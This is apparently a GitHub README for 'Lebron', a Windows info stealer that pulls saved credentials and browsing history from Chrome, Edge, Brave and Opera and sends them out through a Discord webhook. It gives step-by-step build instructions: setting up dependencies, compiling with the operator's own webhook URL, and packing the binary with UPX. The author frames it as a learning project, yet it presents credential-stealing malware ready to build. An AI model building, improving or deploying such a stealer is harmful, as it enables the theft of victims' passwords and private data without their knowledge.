# Lebron
![image](https://github.com/komodoooo/Lebron/assets/68278515/85f25bab-f83b-401b-ada3-8c3afc11c32f)

A Chromium-based info stealer for windows, sends credentials & history via a discord webhook

The program currently supports the following broswers:
* Chrome
* Edge
* Brave
* Opera / GX

###### * only the stable versions of these broswers are actually supported
# Compile
1. **Requirements**  
   Ensure the following tools are installed on your Windows machine:  
   - `go`  
   - `make`  
   - `upx`  

   You can use [Scoop](https://scoop.sh) for easy installation of these dependencies.

2. **Set Up Dependencies**  
   Run the following command to set up the required dependencies:  
   `make setup`
3. **Build and Compress**  
   Compile and compress the executable with the following command:  
   `make build WEBHOOK="YOUR_DISCORD_WEBHOOK"`<br>
   You can also set the compression level with `COMPRESSION_LEVEL` (1-9, default:7)
5. **Clean Up**  
   Once the build is complete, you can remove temporary files with:  
   `make clean`

## Notes
I based myself on various detailed reads i found online.<br>
I just wrote this for learning & fun purposes.<br>
